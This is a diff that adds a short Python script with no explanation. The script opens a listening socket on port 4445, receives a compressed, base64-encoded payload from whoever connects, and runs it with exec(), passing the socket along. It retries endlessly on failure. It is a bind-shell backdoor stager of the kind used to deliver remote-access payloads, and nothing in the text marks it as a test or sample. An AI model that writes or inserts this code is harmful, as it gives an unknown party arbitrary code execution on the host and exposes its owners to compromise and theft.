@@ -1,0 +1,29 @@
+port = 4445
+
+import zlib
+import base64
+import socket
+import struct
+import time
+
+def main():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(('0.0.0.0', int(port)))
+        s.listen(1)
+        client, addr = s.accept()
+        
+        length = struct.unpack('>I', client.recv(4))[0]
+        data = client.recv(length)
+        
+        while len(data) < length:
+            data += client.recv(length - len(data))
+        
+        exec(zlib.decompress(base64.b64decode(data)), {'s': client})
+        
+    except Exception:
+        time.sleep(10)
+        main()
+
+if __name__ == "__main__":
+    main()
